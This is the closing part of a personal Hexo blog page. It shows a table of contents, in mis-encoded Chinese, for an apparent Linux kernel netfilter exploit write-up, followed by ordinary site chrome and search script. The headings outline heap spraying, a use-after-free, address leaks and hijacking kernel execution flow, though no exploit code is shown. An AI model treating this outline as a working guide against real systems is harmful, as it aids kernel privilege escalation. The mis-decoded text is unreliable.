          â‘ åˆ›å»º</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-3"><span class="toc-text">
          â‘¡é‡Šæ”¾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E9%87%8A%E6%94%BE-2"><span class="toc-text">
          (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%86%E9%85%8D-1"><span class="toc-text">
          â‘ åˆ†é…</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7-1"><span class="toc-text">
          A.å†…å­˜ç”³è¯·</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E6%80%BB%E7%BB%93%EF%BC%9A-1"><span class="toc-text">
          å†…å­˜ç”³è¯·æ€»ç»“ï¼š</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6-1"><span class="toc-text">
          B.æ•°æ®å¤åˆ¶</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-4"><span class="toc-text">
          â‘¡é‡Šæ”¾</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6"><span class="toc-text">
          A.æ•°æ®å¤åˆ¶</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E5%86%85%E5%AD%98%E9%87%8A%E6%94%BE"><span class="toc-text">
          B.å†…å­˜é‡Šæ”¾</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%87%8A%E6%94%BE%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">
          å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">
          ä¸€ã€æ¼æ´åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">
          å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-nf-setsockopt"><span class="toc-text">
          1.nf_setsockopt()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-do-ipt-set-ctl"><span class="toc-text">
          2.do_ipt_set_ctl()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-compat-do-replace"><span class="toc-text">
          3.compat_do_replace()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-translate-compat-table"><span class="toc-text">
          4.translate_compat_table()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-compat-copy-entry-from-user"><span class="toc-text">
          5.compat_copy_entry_from_user()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-xt-compat-match-from-user"><span class="toc-text">
          6.xt_compat_match_from_user()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-xt-compat-target-from-user"><span class="toc-text">
          6.xt_compat_target_from_user()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">
          æ€»ç»“</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8E%A7%E5%88%B6%E5%A0%86%E5%9D%97%E5%A4%A7%E5%B0%8F%E5%92%8C%E5%81%8F%E7%A7%BB"><span class="toc-text">
          (1)æ§åˆ¶å †å—å¤§å°å’Œåç§»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8E%A7%E5%88%B6%E5%A1%AB%E5%85%85pad"><span class="toc-text">
          (2)æ§åˆ¶å¡«å……pad</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">
          äºŒã€æ¼æ´åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BA%A2%E5%87%BA%E8%BD%AC%E5%8C%96UAF"><span class="toc-text">
          1.æº¢å‡ºè½¬åŒ–UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A0%86%E5%96%B7%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-text">
          (1)å †å–·å†…å­˜å¸ƒå±€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%BA%A2%E5%87%BA%E6%9E%84%E9%80%A0UAF"><span class="toc-text">
          (2)æ¼æ´æº¢å‡ºæ„é€ UAF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8UAF"><span class="toc-text">
          2.åˆ©ç”¨UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="toc-text">
          (1)æ³„éœ²å †åœ°å€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-text">
          (2)æ³„éœ²å†…æ ¸åŸºåœ°å€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-text">
          (3)åŠ«æŒç¨‹åºæ‰§è¡Œæµ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-EXP%E8%A7%A3%E6%9E%90"><span class="toc-text">
          3.EXPè§£æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BB%91%E5%AE%9ACPU%E5%88%86%E9%85%8D"><span class="toc-text">
          (1)ç»‘å®šCPUåˆ†é…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-text">
          (2)å‘½åç©ºé—´</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9C%80%E7%BB%88EXP"><span class="toc-text">
          (3)æœ€ç»ˆEXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">
          å‚è€ƒ</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">122</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">68</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">64</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>